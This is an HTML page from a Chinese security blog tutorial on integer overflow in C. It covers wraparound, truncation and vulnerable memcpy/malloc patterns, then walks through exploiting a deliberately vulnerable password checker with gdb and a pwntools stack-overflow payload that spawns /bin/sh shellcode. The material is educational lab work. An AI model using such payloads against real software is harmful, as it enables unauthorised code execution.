@@ -1,0 +1,204 @@
+<!doctype html><html lang=zh-hans><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="Liq3e"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-166034540-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><link rel=prev href=https://blog.usec.cc/posts/security/reverse/reverse-basic/><link rel=next href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-1/><link rel=canonical href=https://blog.usec.cc/posts/security/reverse/integer-overflow/><link rel=icon type=image/png sizes=32x32 href=/favicon.ico><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>整数溢出 | L33'</title><meta name=title content="整数溢出 | L33'"><link rel=stylesheet href=/font/iconfont.css><link rel=stylesheet href=/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.usec.cc/"},"articleSection":"posts","name":"整数溢出","headline":"整数溢出","description":"文章内容参考来源：CTF-All-In-One 整数溢出 关于整数的异常情况主要有三种： 溢出 只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出 溢出标志 OF 可检测有符号数的溢出 回绕 无符号数 0-1 时会变成最大的数，如 1 字节的无符号数会变为 255","inLanguage":"zh-Hans","author":"Liq3e","creator":"Liq3e","publisher":"Liq3e","accountablePerson":"Liq3e","copyrightHolder":"Liq3e","copyrightYear":"2017","datePublished":"2017-11-15T00:00:00+08:00","dateModified":"2017-11-15T00:00:00+08:00","url":"https://blog.usec.cc/posts/security/reverse/integer-overflow/","wordCount":2091,"keywords":["Reverse","integer overflow","L33'"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class="menu navbar-right"><a class=menu-item href=/posts/>Posts</a>
+<a class=menu-item href=/categories/>Categories</a>
+<a class=menu-item href=/tags/>Tags</a>
+<a class=menu-item href=/about/ title=About>About</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=/posts/>Posts</a>
+<a class=menu-item href=/categories/>Categories</a>
+<a class=menu-item href=/tags/>Tags</a>
+<a class=menu-item href=/about/ title=About>About</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">整数溢出</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.usec.cc/ rel=author>Liq3e</a> with ♥
+<span class=post-time>on <time datetime=2017-11-15 itemprop=datePublished>November 15, 2017</time></span>
+in
+<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.usec.cc/categories/security/>Security</a></span></div></header><div class=post-content><blockquote><p>文章内容参考来源：<a href=https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.3.2_integer_overflow.html>CTF-All-In-One</a></p></blockquote><h2 id=整数溢出>整数溢出</h2><p>关于整数的异常情况主要有三种：</p><ul><li>溢出<ul><li>只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出</li><li>溢出标志 <code>OF</code> 可检测有符号数的溢出</li></ul></li><li>回绕<ul><li>无符号数 <code>0-1</code> 时会变成最大的数，如 1 字节的无符号数会变为 <code>255</code>，而 <code>255+1</code> 会变成最小数 <code>0</code>。</li><li>进位标志 <code>CF</code> 可检测无符号数的回绕</li></ul></li><li>截断<ul><li>将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</li></ul></li></ul><h3 id=有符号整数溢出>有符号整数溢出</h3><p><img src=./signed_integer.png alt=有符号整数></p><ul><li><p>上溢出</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> i;
+i <span style=color:#f92672>=</span> INT_MAX;  <span style=color:#75715e>// 2 147 483 647
+</span><span style=color:#75715e></span>i<span style=color:#f92672>++</span>;
+printf(<span style=color:#e6db74>&#34;i = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, i);  <span style=color:#75715e>// i = -2 147 483 648
+</span></code></pre></div></li><li><p>下溢出</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>i <span style=color:#f92672>=</span> INT_MIN;  <span style=color:#75715e>// -2 147 483 648
+</span><span style=color:#75715e></span>i<span style=color:#f92672>--</span>;
+printf(<span style=color:#e6db74>&#34;i = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, i);  <span style=color:#75715e>// i = 2 147 483 647
+</span></code></pre></div></li></ul><h3 id=无符号数回绕>无符号数回绕</h3><p><img src=unsigned_integer.png alt=无符号整数></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> ui;
+ui <span style=color:#f92672>=</span> UINT_MAX;  <span style=color:#75715e>// 在 x86-32 上为 4 294 967 295
+</span><span style=color:#75715e></span>ui<span style=color:#f92672>++</span>;
+printf(<span style=color:#e6db74>&#34;ui = %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, ui);  <span style=color:#75715e>// ui = 0
+</span><span style=color:#75715e></span>ui <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+ui<span style=color:#f92672>--</span>;
+printf(<span style=color:#e6db74>&#34;ui = %u</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, ui);  <span style=color:#75715e>// 在 x86-32 上，ui = 4 294 967 295
+</span></code></pre></div><h3 id=截断>截断</h3><ul><li><p>加法截断：</p><pre><code>0xffffffff + 0x00000001
+= 0x0000000100000000 (long long)
+= 0x00000000 (long)
+
+</code></pre></li><li><p>乘法截断：</p><pre><code>0x00123456 * 0x00654321
+= 0x000007336BF94116 (long long)
+= 0x6BF94116 (long)
+</code></pre></li></ul><h3 id=整型提升和宽度溢出>整型提升和宽度溢出</h3><p>整型提升是指当计算表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><p>示例：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>() {
+    <span style=color:#66d9ef>int</span> l;  
+    <span style=color:#66d9ef>short</span> s;
+    <span style=color:#66d9ef>char</span> c;
+
+    l <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xabcddcba</span>;
+    s <span style=color:#f92672>=</span> l;
+    c <span style=color:#f92672>=</span> l;
+
+    printf(<span style=color:#e6db74>&#34;宽度溢出</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+    printf(<span style=color:#e6db74>&#34;l = 0x%x (%d bits)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, l, <span style=color:#66d9ef>sizeof</span>(l) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>);
+    printf(<span style=color:#e6db74>&#34;s = 0x%x (%d bits)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, s, <span style=color:#66d9ef>sizeof</span>(s) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>);
+    printf(<span style=color:#e6db74>&#34;c = 0x%x (%d bits)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, c, <span style=color:#66d9ef>sizeof</span>(c) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>);
+
+    printf(<span style=color:#e6db74>&#34;整型提升</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+    printf(<span style=color:#e6db74>&#34;s + c = 0x%x (%d bits)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, s<span style=color:#f92672>+</span>c, <span style=color:#66d9ef>sizeof</span>(s<span style=color:#f92672>+</span>c) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>);
+}
+</code></pre></div><pre><code>$ ./a.out
+宽度溢出
+l = 0xabcddcba (32 bits)
+s = 0xffffdcba (16 bits)
+c = 0xffffffba (8 bits)
+整型提升
+s + c = 0xffffdc74 (32 bits)
+</code></pre><h2 id=整数溢出实例>整数溢出实例</h2><h3 id=漏洞多发函数>漏洞多发函数</h3><p>我们说过整数溢出要配合上其他类型的缺陷才能有用，下面的两个函数都有一个 <code>size_t</code> 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>memcpy</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>dest, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>src, size_t n);
+</code></pre></div><p><code>memcpy()</code> 函数将 <code>src</code> 所指向的字符串中以 <code>src</code> 地址开始的前 <code>n</code> 个字节复制到 <code>dest</code> 所指的数组中，并返回 <code>dest</code>。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>strncpy</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>dest, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>src, size_t n);
+</code></pre></div><p><code>strncpy()</code> 函数从源 <code>src</code> 所指的内存地址的起始位置开始复制 <code>n</code> 个字节到目标 <code>dest</code> 所指的内存地址的起始位置中。</p><p>两个函数中都有一个类型为 <code>size_t</code> 的参数，它是无符号整型的 <code>sizeof</code> 运算符的结果。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> size_t;
+</code></pre></div><h3 id=示例>示例</h3><h4 id=整数转换>整数转换</h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>80</span>];
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vulnerable</span>() {
+    <span style=color:#66d9ef>int</span> len <span style=color:#f92672>=</span> read_int_from_network();
+    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> read_string_from_network();
+    <span style=color:#66d9ef>if</span> (len <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>80</span>) {
+        error(<span style=color:#e6db74>&#34;length too large: bad dog, no cookie for you!&#34;</span>);
+        <span style=color:#66d9ef>return</span>;
+    }
+    memcpy(buf, p, len);
+}
+</code></pre></div><p>这个例子的问题在于，如果攻击者给 <code>len</code> 赋于了一个负数，则可以绕过 <code>if</code> 语句的检测，而执行到 <code>memcpy()</code> 的时候，由于第三个参数是 <code>size_t</code> 类型，负数 <code>len</code> 会被转换为一个无符号整型，它可能是一个非常大的正数，从而复制了大量的内容到 <code>buf</code> 中，引发了缓冲区溢出。</p><h4 id=回绕和溢出>回绕和溢出</h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vulnerable</span>() {
+    size_t len;
+    <span style=color:#75715e>// int len;
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> buf;
+
+    len <span style=color:#f92672>=</span> read_int_from_network();
+    buf <span style=color:#f92672>=</span> malloc(len <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>);
+    read(fd, buf, len);
+    ...
+}
+</code></pre></div><p>这个例子看似避开了缓冲区溢出的问题，但是如果 <code>len</code> 过大，<code>len+5</code> 有可能发生回绕。比如说，在 x86-32 上，如果 <code>len = 0xFFFFFFFF</code>，则 <code>len+5 = 0x00000004</code>，这时 <code>malloc()</code> 只分配了 4 字节的内存区域，然后在里面写入大量的数据，缓冲区溢出也就发生了。（如果将 <code>len</code> 声明为有符号 <code>int</code> 类型，<code>len+5</code> 可能发生溢出）</p><h4 id=截断-1>截断</h4><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
+    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>short</span> <span style=color:#66d9ef>int</span> total;
+    total <span style=color:#f92672>=</span> strlen(argv[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>+</span> strlen(argv[<span style=color:#ae81ff>2</span>]) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buf <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)malloc(total);
+    strcpy(buf, argv[<span style=color:#ae81ff>1</span>]);
+    strcat(buf, argv[<span style=color:#ae81ff>2</span>]);
+    ...
+}
+</code></pre></div><p>这个例子接受两个字符串类型的参数并计算它们的总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串参数复制到缓冲区中，然后将第二个参数连接到尾部。如果攻击者提供的两个字符串总长度无法用 <code>total</code> 表示，则会发生截断，从而导致后面的缓冲区溢出。</p><h2 id=实战>实战</h2><p>接下来，我们来真正利用一个整数溢出漏洞。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>validate_passwd</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>passwd) {
+    <span style=color:#66d9ef>char</span> passwd_buf[<span style=color:#ae81ff>11</span>];
+    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> passwd_len <span style=color:#f92672>=</span> strlen(passwd);
+    <span style=color:#66d9ef>if</span>(passwd_len <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>&amp;&amp;</span> passwd_len <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>8</span>) {
+        printf(<span style=color:#e6db74>&#34;good!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+        strcpy(passwd_buf, passwd);
+    } <span style=color:#66d9ef>else</span> {
+        printf(<span style=color:#e6db74>&#34;bad!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+    }
+}
+
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
+    <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>) {
+        printf(<span style=color:#e6db74>&#34;error</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+    }
+    validate_passwd(argv[<span style=color:#ae81ff>1</span>]);
+}
+</code></pre></div><p>上面的程序中 <code>strlen()</code> 返回类型是 <code>size_t</code>，却被存储在无符号字符串类型中，任意超过无符号字符串最大上限值（256 字节）的数据都会导致截断异常。当密码长度为 261 时，截断后值变为 5，成功绕过了 <code>if</code>的判断，导致栈溢出。下面我们利用溢出漏洞来获得 shell。</p><p>编译程序，<code>-g</code>参数是添加调试符号信息，<code>-z execstack</code>是取消堆栈代码运行保护。</p><pre><code>$ gcc -g -fno-stack-protector -z execstack vuln.c
+</code></pre><p>使用 gdb 反汇编 <code>validate_passwd</code> 函数。</p><pre><code class=language-assembly data-lang=assembly>gdb-peda$ disassemble validate_passwd
+Dump of assembler code for function validate_passwd:
+   0x00000600 &lt;+0&gt;:	push   ebp
+   0x00000601 &lt;+1&gt;:	mov    ebp,esp
+   0x00000603 &lt;+3&gt;:	push   ebx
+   0x00000604 &lt;+4&gt;:	sub    esp,0x14
+   0x00000607 &lt;+7&gt;:	call   0x4d0 &lt;__x86.get_pc_thunk.bx&gt;
+   0x0000060c &lt;+12&gt;:	add    ebx,0x19f4
+   0x00000612 &lt;+18&gt;:	sub    esp,0xc
+   0x00000615 &lt;+21&gt;:	push   DWORD PTR [ebp+0x8]
+   0x00000618 &lt;+24&gt;:	call   0x460 &lt;strlen@plt&gt;
+   0x0000061d &lt;+29&gt;:	add    esp,0x10
+   0x00000620 &lt;+32&gt;:	mov    BYTE PTR [ebp-0x9],al
+   0x00000623 &lt;+35&gt;:	cmp    BYTE PTR [ebp-0x9],0x3
+   0x00000627 &lt;+39&gt;:	jbe    0x655 &lt;validate_passwd+85&gt;
+   0x00000629 &lt;+41&gt;:	cmp    BYTE PTR [ebp-0x9],0x8
+   0x0000062d &lt;+45&gt;:	ja     0x655 &lt;validate_passwd+85&gt;
+   0x0000062f &lt;+47&gt;:	sub    esp,0xc
+   0x00000632 &lt;+50&gt;:	lea    eax,[ebx-0x18b0]
+   0x00000638 &lt;+56&gt;:	push   eax
+   0x00000639 &lt;+57&gt;:	call   0x450 &lt;puts@plt&gt;
+   0x0000063e &lt;+62&gt;:	add    esp,0x10
+   0x00000641 &lt;+65&gt;:	sub    esp,0x8
+   0x00000644 &lt;+68&gt;:	push   DWORD PTR [ebp+0x8]
+   0x00000647 &lt;+71&gt;:	lea    eax,[ebp-0x14]
+   0x0000064a &lt;+74&gt;:	push   eax
+   0x0000064b &lt;+75&gt;:	call   0x440 &lt;strcpy@plt&gt;
+   0x00000650 &lt;+80&gt;:	add    esp,0x10
+   0x00000653 &lt;+83&gt;:	jmp    0x667 &lt;validate_passwd+103&gt;
+   0x00000655 &lt;+85&gt;:	sub    esp,0xc
+   0x00000658 &lt;+88&gt;:	lea    eax,[ebx-0x18aa]
+   0x0000065e &lt;+94&gt;:	push   eax
+   0x0000065f &lt;+95&gt;:	call   0x450 &lt;puts@plt&gt;
+   0x00000664 &lt;+100&gt;:	add    esp,0x10
+   0x00000667 &lt;+103&gt;:	nop
+   0x00000668 &lt;+104&gt;:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x0000066b &lt;+107&gt;:	leave  
+   0x0000066c &lt;+108&gt;:	ret    
+End of assembler dump.
+</code></pre><p>从上述代码可知<code>passwd_buf</code>的的内存位于<code>ebp-0x14</code>的位置，而函数的返回地址总是在<code>ebp+0x4</code>的位置，所以返回地址位于相对<code>passwd_buf</code>起始处<code>0x18</code>的位置。</p><p>可以测试一下：</p><pre><code class=language-assembly data-lang=assembly>EAX: 0xffffd184 ('A' &lt;repeats 24 times&gt;, &quot;BBBB&quot;, 'C' &lt;repeats 172 times&gt;...)
+EBX: 0x41414141 ('AAAA')
+ECX: 0xffffd520 (&quot;CCCCCC&quot;)
+EDX: 0xffffd283 (&quot;CCCCCC&quot;)
+ESI: 0x2 
+EDI: 0xf7fb3000 --&gt; 0x1b2db0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd1a0 ('C' &lt;repeats 200 times&gt;...)
+EIP: 0x42424242 ('BBBB')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x42424242
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd1a0 ('C' &lt;repeats 200 times&gt;...)
+0004| 0xffffd1a4 ('C' &lt;repeats 200 times&gt;...)
+0008| 0xffffd1a8 ('C' &lt;repeats 200 times&gt;...)
+0012| 0xffffd1ac ('C' &lt;repeats 200 times&gt;...)
+0016| 0xffffd1b0 ('C' &lt;repeats 200 times&gt;...)
+0020| 0xffffd1b4 ('C' &lt;repeats 200 times&gt;...)
+0024| 0xffffd1b8 ('C' &lt;repeats 200 times&gt;...)
+0028| 0xffffd1bc ('C' &lt;repeats 200 times&gt;...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+</code></pre><p>程序崩溃时恰好是<code>BBBB</code>位于<code>EIP</code>寄存器内。并且此时的<code>ESP</code>内的值即为之前<code>strcpy</code>函数执行期间<code>EBP</code>寄存器内的值。</p><p>可以构建下面的payload：</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>                                       
+
+ret_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffd1a8</span>     <span style=color:#75715e># ebp = 0xffffd1a0</span>
+shellcode <span style=color:#f92672>=</span> shellcraft<span style=color:#f92672>.</span>i386<span style=color:#f92672>.</span>sh()
+
+payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>24</span>
+payload <span style=color:#f92672>+=</span> p32(ret_addr)
+payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>10</span>
+payload <span style=color:#f92672>+=</span> asm(shellcode)
+payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>179</span>      <span style=color:#75715e># 24 + 4 + 20 + 44 + 169 = 261</span>
+
+<span style=color:#66d9ef>print</span> payload
+</code></pre></div><p>在GDB中执行，则可以得到预期结果：</p><pre><code>gdb-peda$ r `python2 exp.py `
+Starting program: /home/test/ctfaio/vuln `python2 exp.py `
+good!
+process 98974 is executing new program: /bin/dash
+$ echo 1
+1
+</code></pre><p>但是直接运行程序却无法拿到shell，个人认为是由于直接运行程序的时候栈地址不同于在GDB中运行时。</p></div><div class=post-copyright><p class=copyright-item><span>Author:</span>
+<span>Liq3e</span></p><p class=copyright-item><span>Link:</span>
+<a href=https://blog.usec.cc/posts/security/reverse/integer-overflow/>https://blog.usec.cc/posts/security/reverse/integer-overflow/</a></p></div><div class=post-tags><section><i class="iconfont icon-tag"></i>Tag(s):
+<span class=tag><a href=https://blog.usec.cc/tags/reverse/>#Reverse</a></span>
+<span class=tag><a href=https://blog.usec.cc/tags/integer-overflow/>#integer overflow</a></span></section><section><a href=javascript:window.history.back();>back</a></span> ·
+<span><a href=https://blog.usec.cc/>home</a></span></section></div><div class=post-nav><a href=https://blog.usec.cc/posts/security/reverse/reverse-basic/ class=prev rel=prev title=逆向工程基础><i class="iconfont icon-left"></i>&nbsp;逆向工程基础</a>
+<a href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-1/ class=next rel=next title="Exploit-exercises Nebula (Level00~09)">Exploit-exercises Nebula (Level00~09)&nbsp;<i class="iconfont icon-right"></i></a></div><div class=post-comment><div id=disqus_thread></div><script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return;}
+var d=document,s=d.createElement('script');s.async=true;s.src='//'+"l33-1"+'.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div></main><footer class=footer><div class=copyright>&copy;
+<span itemprop=copyrightYear>2020 - 2020</span>
+<span class=with-love><i class="iconfont icon-love"></i></span><span class=author itemprop=copyrightHolder><a href=https://blog.usec.cc/>Liq3e</a> |</span>
+<span>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow">Hugo</a> & <a href=https://github.com/liuzc/leaveit target=_blank rel="external nofollow">LeaveIt</a></span></div></footer><link href=//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css rel=stylesheet><script src=/js/vendor_gallery.min.js async></script></div></body></html>
